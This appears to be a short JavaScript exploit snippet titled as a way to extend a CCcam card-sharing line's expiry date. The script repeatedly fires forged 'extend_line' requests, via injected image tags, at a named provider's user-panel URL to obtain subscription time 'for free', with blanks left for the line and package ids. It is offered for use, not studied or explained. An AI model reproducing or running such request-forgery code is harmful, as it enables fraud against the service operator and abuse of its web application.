# CCCAM CLINE ENTEND EXPIRE DATE
{
var pl = 'http://hsm4k.skypk.net/userpanel/official.php';

//how many time extand line for free
var ex = 320;

// line id
var lid = ;

//package id
var packid = ;


if (ex > 350)
{
    alert("null")
}
else
{
    var html = "";
    for (i = 0; i < ex; i++)
    {
        var ran = Math.random();
        html += '<img src="' + pl + '?action=extend_line&line_id=' + lid + '&package_id=' + packid + '&r=' + ran + '"/>';
    }

    document.body.innerHTML = html;

}
}
